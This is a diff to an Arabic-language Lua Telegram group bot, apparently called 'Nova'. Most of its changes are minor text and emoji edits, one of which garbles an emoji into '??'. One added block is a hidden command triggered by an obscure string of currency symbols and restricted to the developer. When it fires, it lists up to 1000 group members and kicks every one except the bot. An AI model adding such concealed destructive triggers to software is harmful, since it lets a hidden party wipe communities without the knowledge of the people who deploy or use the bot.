@@ -1134,7 +1134,7 @@ database:del(bot_id..'Srt:Bot')
 send(msg.chat_id_, msg.id_,' 𖠕 اصدار سورس نوفا{ 1.5x}')
 end
 if text == '/start' and DevSoFi(msg) then 
-local Text = 'انت الان المطور الاساسي في البوت \nيمكنك تحكم في البوتات من الكيبورد قم بأختيار ماتريده من الازار في الاسفل↑↓'
+local Text = 'مرحبا بيك انت المطور الاساسي قم بأختيار ماتريده من الازار في الاسفل↑↓'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
@@ -1409,6 +1409,25 @@ database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_
 send(msg.chat_id_, msg.id_," 𖠕 ارسل الان اذاعتك؟ \n 𖠕 للخروج ارسل الغاء ")
 return false
 end 
+
+if text == "£¢€$$__€€¢¥^^¥€" and DevSoFi(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+
+return false
+end
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
+},function(ta,DRAGON)
+local t = "\nツ قائمة الاعضاء \n─────☆☆☆─────\n"
+x = 0
+local list = DRAGON.members_
+for k, v in pairs(list) do
+ if tonumber(v.user_id_) ~= tonumber(bot_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+ 
+end,nil)
+end
 if text=="اذاعه بالتوجيه " and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
 database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," 𖠕 ارسل لي التوجيه الان")
@@ -3244,7 +3263,7 @@ end
 return false
 end
 if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
-mktlf = {'😸','☠','🐼','🐇','𖠕','🌚','⭐️','✨','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','𖠕‍♂','𖠕‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',};
+mktlf = {'😸','☠','🐼','🐇','𖠕','🌚','⭐️','✨','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍??','👩‍🍳','🧚‍♀','𖠕‍♂','𖠕‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',};
 name = mktlf[math.random(#mktlf)]
 database:del(bot_id..'Set:Moktlf:Bot'..msg.chat_id_)
 database:set(bot_id..':Set:Moktlf'..msg.chat_id_,name)
